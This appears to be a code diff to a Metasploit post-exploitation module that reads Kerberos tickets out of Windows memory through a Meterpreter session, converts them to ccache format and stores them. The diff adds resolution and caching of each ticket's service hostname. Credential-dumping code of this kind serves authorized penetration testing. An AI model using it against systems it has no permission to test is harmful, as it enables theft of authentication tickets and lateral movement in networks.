@@ -64,6 +64,7 @@ class MetasploitModule < Msf::Post
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
+              stdapi_net_resolve_host
               stdapi_railgun_api
               stdapi_railgun_memread
               stdapi_railgun_memwrite
@@ -89,6 +90,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
+    @hostname_cache = {}
     @indent_level = 0
     unless session.native_arch == ARCH_X64
       fail_with(Failure::NoTarget, 'This module only support x64 sessions.')
@@ -196,10 +198,13 @@ class MetasploitModule < Msf::Post
 
         retrieve_tkt_res = KERB_RETRIEVE_TKT_RESPONSE_x64.read(retrieve_tkt_res_ptr.contents)
         if retrieve_tkt_res.ticket.encoded_ticket != 0
-          kirbi_ticket = session.railgun.memread(retrieve_tkt_res.ticket.encoded_ticket, retrieve_tkt_res.ticket.encoded_ticket_size)
-          ccache_ticket = kirbi_to_ccache(kirbi_ticket)
-          Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache_ticket, framework_module: self)
-          presenter = Rex::Proto::Kerberos::CredentialCache::Krb5CcachePresenter.new(ccache_ticket)
+          ticket = kirbi_to_ccache(session.railgun.memread(retrieve_tkt_res.ticket.encoded_ticket, retrieve_tkt_res.ticket.encoded_ticket_size))
+          ticket_host = ticket.credentials.first.server.components.last.snapshot
+          ticket_host = resolve_host(ticket_host) if ticket_host
+
+          Rex::Proto::Kerberos::CredentialCache::Krb5Ccache.read(ticket.encode)
+          Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: ticket_host)
+          presenter = Rex::Proto::Kerberos::CredentialCache::Krb5CcachePresenter.new(ticket)
           print_line(presenter.present.split("\n").map { |line| "    #{print_prefix}#{line}" }.join("\n"))
         end
         session.railgun.secur32.LsaFreeReturnBuffer(retrieve_tkt_res_ptr.value)
@@ -255,6 +260,19 @@ class MetasploitModule < Msf::Post
       return nil
     end
     TOKEN_STATISTICS.read(result['TokenInformation'])
+  end
+
+  def resolve_host(name)
+    name = name.dup.downcase # normalize the case since DNS is case insensitive
+    return @hostname_cache[name] if @hostname_cache.key?(name)
+
+    vprint_status("Resolving hostname: #{name}")
+    begin
+      address = session.net.resolve.resolve_host(name)[:ip]
+    rescue Rex::Post::Meterpreter::RequestError => e
+      elog("Unable to resolve #{name.inspect}", error: e)
+    end
+    @hostname_cache[name] = address
   end
 
   def print_logon_session_summary(logon_session_data_ptr, annotation: nil)
